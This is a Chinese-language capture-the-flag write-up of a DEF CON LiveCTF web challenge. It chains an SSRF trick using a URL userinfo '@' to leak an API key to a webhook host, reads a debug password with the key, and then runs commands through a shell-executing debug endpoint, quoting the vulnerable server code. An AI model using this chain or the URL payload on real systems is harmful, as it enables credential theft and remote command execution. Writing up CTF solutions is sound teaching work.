# rather-susceptible-service

起因是我在看 livectf 2024 final 的时候（~~当综艺节目看的~~）突然看到了web题目，真是太神奇了，def con主办方竟然会出web题让选手进行竞速，闻所未闻。

但是好在题目不算太难，毕竟选手也是纯人力进行代码审计，均未使用任何ai工具🧎‍♂️，同时还有时间限制。

选手在竞赛时官方给出了两个hint

> Hint 1: How is the API key passed to the backend?
> Hint 2:What can be placed in a URL before the hostname?

这道题只给了server.py，代码量大概在450行左右，说实话让人来看还是有点吃力，好在注册路由什么基本都是一样的，但是rss确实有误导性

rss相关的import路由，但这个不是重点，人类选手很容易以为是rssparser相关的漏洞

```python
@app.post("/import")
def do_rss_import():
    if 'user_id' not in session:
        return redirect(url_for('index'))
    
    error = False
    url = request.form.get('url', None)
    if not url:
        flash('Missing url', 'error')
        error = True
    
    if error:
        return redirect(url_for('import_rss_form'))

    try:
        r = http_request(http_client, 'GET', url)
    except:
        flash('Failed to fetch RSS feed', 'error')
        return redirect(url_for('import_rss_form'))
    
    try:
        rss = RSSParser.parse(r.text)
    except:
        flash('Invalid RSS feed', 'error')
        return redirect(url_for('import_rss_form'))
    
    for item in rss.channel.items:
        r = http_request(http_client, 'POST', API_SERVER + '/api/posts', {'user_id': session['user_id'], 'title': str(item.title.content), 'body': str(item.description.content)})
        result = r.json()
        if (error_message := result.get('error', None)) != None:
            flash(error_message, 'error')
            return redirect(url_for('import_rss_form'))

    return redirect(url_for('posts_list'))
```

api-key的传递方式就是挂载，只要是`API_SERVER`开头的就会自动发送`X-API-KEY`

```python
class ApiAdapter(HTTPAdapter):
    def add_headers(self, request, **kwargs):
        request.headers['X-API-KEY'] = API_KEY
        
def init_http_client():
    s = requests.Session()
    s.mount(API_SERVER, ApiAdapter())
    return s
```

查看源码也可以发现：

```python
class Session(SessionRedirectMixin):
    ...
    # Get the appropriate adapter to use
    adapter = self.get_adapter(url=request.url)

# redirect to get_adapter
def get_adapter(self, url):
    """
    Returns the appropriate connection adapter for the given URL.
    :rtype: requests.adapters.BaseAdapter
    """
    for prefix, adapter in self.adapters.items():
        if url.lower().startswith(prefix.lower()):
            return adapter
```

可以使用url解析的差异进行ssrf，用@让浏览器以为返回的地址在后面

```
协议://用户名:密码@主机名:端口号/路径
```

用webhook或者其他工具进行接收

```txt
http://localhost:31337@webhook.site/<REDACTED>/
```

![image-20260621230322366](./images/image-20260621230322366.png)

```txt
x-api-key: 2be22c769f2f84d7fcd96fa6e3f911b4
```

拿到apikey之后就可以去 `/api/users/1/posts` 拿到 `debug_password`

```python
@app.get("/api/users/<int:user_id>/posts")
def api_get_user_posts(user_id):
    if request.headers.get('x-API-KEY', None) != API_KEY:
        return jsonify({'error': 'Invalid API key'}), 403
    
    db_conn = get_db_conn()
    try:
        with db_conn:
            cur = db_conn.cursor()
            cur.execute('SELECT * FROM posts WHERE user_id = ?;', (user_id,))
            posts = cur.fetchall()
            cur.close()
    except sqlite3.Error as e:
        return jsonify({'error': f'failed to get users: {e}'}), 500
    finally:
        db_conn.close()

    return jsonify({'error': None, 'posts': [dict(x) for x in posts]})
```

```txt
{"error":null,"posts":[{"body":"The debug password is: 0c1569556618924a21424ac0f6b6c595","id":1,"title":"Debug password","user_id":1}]}
```

```
debug_password=0c1569556618924a21424ac0f6b6c595
```

拿到debug_password直接去debug页面执行指令就可以了

```python
@app.post("/debug")
def do_debug():
    error = False
    debug_password_input = request.form.get('debug_password', None)
    if not debug_password:
        flash('Missing debug_password', 'error')
        error = True
    command = request.form.get('command', None)
    if not command:
        flash('Missing command', 'error')
        error = True
        
    if debug_password_input != debug_password:
        flash('Incorrect debug password', 'error')
        error = True
        
    if error:
        return redirect(url_for('debug_form'))
    
    output = subprocess.check_output(command, shell=True).decode()

    return render_template('debug.html', session=session, output=output)
```

![image-20260621230624619](./images/image-20260621230624619.png)

这道题我尝试直接把server.py的源码发给Chatgpt5.5，对方只思考了10秒钟就给了我最关键的漏洞🤯

然而最厉害的人类选手还是做了将近50分钟🤫，但是人类解题的魅力就在于不断的试错和复盘。

跑步比赛，赛车比赛以及自动驾驶竞速都有其存在的意义，不是吗

更多细节可以见[这里](https://github.com/Auspiow/my-ctf-writeups/tree/main/challenges/2024_DEF_CON_CTF_Finals/web/rather-susceptible-service)